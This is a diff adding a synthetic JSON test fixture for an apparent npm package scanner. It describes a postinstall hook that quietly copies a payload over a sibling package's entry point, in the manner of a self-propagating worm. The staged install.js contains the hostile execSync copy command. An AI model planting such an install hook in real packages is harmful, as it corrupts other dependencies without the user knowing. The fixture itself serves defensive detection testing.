@@ -1,0 +1,58 @@
+{
+  "id": "install-root-shell-cd-copy",
+  "title": "Existing postinstall hook changes directory in a shell command and copies over a sibling package",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "A shell command moves to the parent directory with `cd ..` and copies over a sibling package, so its destinations cannot be placed from the command text. Inert fixture; the paths are fixture paths. The source never names the install root, so co-occurrence scoring misses it; reported as a frontier case for propagation.package-mutation.",
+  "expectMinRisk": "high",
+  "expectAnyRule": ["propagation.package-mutation"],
+  "category": "install-time-self-propagation",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 34,
+      "sha256": "prev-install-js",
+      "flags": [],
+      "textSample": "console.log('tinyfmt installed');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 159,
+      "sha256": "staged-install-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('node:child_process');\n// Replace the sibling's entry point with ours.\nexecSync('cd .. && cp tinyfmt/payload.js react/index.js');\n"
+    }
+  ]
+}
